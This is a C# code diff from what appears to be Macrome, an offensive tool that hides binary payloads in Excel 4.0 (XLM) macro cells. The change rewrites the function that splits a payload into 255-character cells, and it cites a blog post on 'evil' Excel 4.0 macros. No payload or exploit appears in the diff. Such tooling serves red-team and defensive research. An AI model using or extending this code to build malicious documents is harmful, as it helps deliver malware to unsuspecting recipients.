@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Security.Cryptography.X509Certificates;
+using System.Text;
 using b2xtranslator.Spreadsheet.XlsFileFormat;
 using b2xtranslator.Spreadsheet.XlsFileFormat.Ptg;
 using b2xtranslator.Spreadsheet.XlsFileFormat.Records;
@@ -18,75 +19,35 @@ namespace Macrome
         /// <summary>
         /// Convert a binary payload into a series of cells representing the binary data.
         /// Can be iterated across as described in https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/
+        ///
+        /// Because of additional binary processing logic added on May 28/29 (the TOOLONGMARKER usage), this no longer needs to identify
+        /// if a character is printable or not.
         /// </summary>
         /// <param name="payload"></param>
         /// <returns></returns>
         public static List<string> BuildPayloadMacros(byte[] payload)
         {
-            //Can technically go up to 255 bytes per line, but this seems to fail if we don't play it safe
-            int maxLineSize = 100; 
+            int maxCellSize = 255;
             List<string> macros = new List<string>();
-            string curMacro = "=";
-            int curOffset = 0;
-            bool lastCharIsPrintable = false;
+            string curMacroString = "";
             foreach (byte b in payload)
             {
-                char c = (char) b;
-                var isPrintable = (!Char.IsControl(c) || Char.IsWhiteSpace(c)) && (int)c < 0x80;
-
-                if (isPrintable && curMacro.Length > 1 && !lastCharIsPrintable)
+                if (b == (byte) 0)
                 {
-                    curMacro += "&\"";
-                }
-                else if (!isPrintable && curMacro.Length > 1 && lastCharIsPrintable)
-                {
-                    curMacro += "\"&";
-                }
-                else if (!isPrintable && !lastCharIsPrintable && curMacro.Length > 1)
-                {
-                    curMacro += "&";
-                }
-                else if (isPrintable && !lastCharIsPrintable)
-                {
-                    curMacro += "\"";
+                    throw new ArgumentException("Payloads cannot contain null bytes");
                 }
 
+                curMacroString += (char) b;
 
-                if (isPrintable)
+                if (curMacroString.Length == maxCellSize)
                 {
-                    lastCharIsPrintable = true;
-                    curMacro += c;
-                }
-                else
-                {
-                    lastCharIsPrintable = false;
-                    curMacro += string.Format("CHAR({0})", (int) b);
-                }
-
-                curOffset += 1;
-                if (curOffset % maxLineSize == 0)
-                {
-                    if (lastCharIsPrintable)
-                    {
-                        curMacro += "\"";
-                    }
-
-                    macros.Add(curMacro);
-                    curMacro = "=";
-                    lastCharIsPrintable = false;
+                    macros.Add(curMacroString);
+                    curMacroString = "";
                 }
             }
 
-            if (curMacro.Length > 1)
-            {
-                if (lastCharIsPrintable)
-                {
-                    curMacro += "\"";
-                }
-                macros.Add(curMacro);
-            }
+            macros.Add(curMacroString);
             macros.Add("END");
-
             return macros;
         }
 
